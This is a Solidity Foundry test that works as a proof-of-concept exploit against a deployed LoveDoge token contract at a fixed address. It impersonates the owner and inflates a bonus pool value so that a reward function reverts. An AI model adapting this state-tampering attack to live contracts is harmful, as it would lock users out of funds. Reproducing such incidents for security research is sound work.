pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface ILoveDoge {
    function owner() external view returns (address);
    function getDays() external view returns (string memory, string memory);
    function sumBounsPiece(string memory yesToday, uint256 num) external returns (bool);
    function dayPoolBounsPiece(string memory yesToday) external view returns (uint256);
    function decimals() external pure returns (uint8);
}



contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────

    address constant TARGET = 0x7144E379C827fA71A7ecAA01d00607cBb7eB1b7A;
    address attacker = address(this);
    ILoveDoge token;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        token = ILoveDoge(TARGET);
        vm.label(TARGET, "LoveDoge");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Get yesterday's date string
        (string memory yesToday, ) = token.getDays();

        // Get owner address
        address owner = token.owner();

        // Impersonate owner and call sumBounsPiece with abnormally high value
        vm.startPrank(owner);
        uint256 largeNum = 10000000000; // 10 billion pieces
        token.sumBounsPiece(yesToday, largeNum);
        vm.stopPrank();

        // Verify the state was tampered - dayPoolBounsPiece should be abnormally high
        uint256 pieceValue = token.dayPoolBounsPiece(yesToday);

        // The value should be: largeNum * 10^decimals = 10000000000 * 10^9 = 10^19
        // This abnormally high value will cause _sumCanGetToken() to revert
        assertGt(pieceValue, 1000000000000000000); // Greater than 10^18
    }




    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

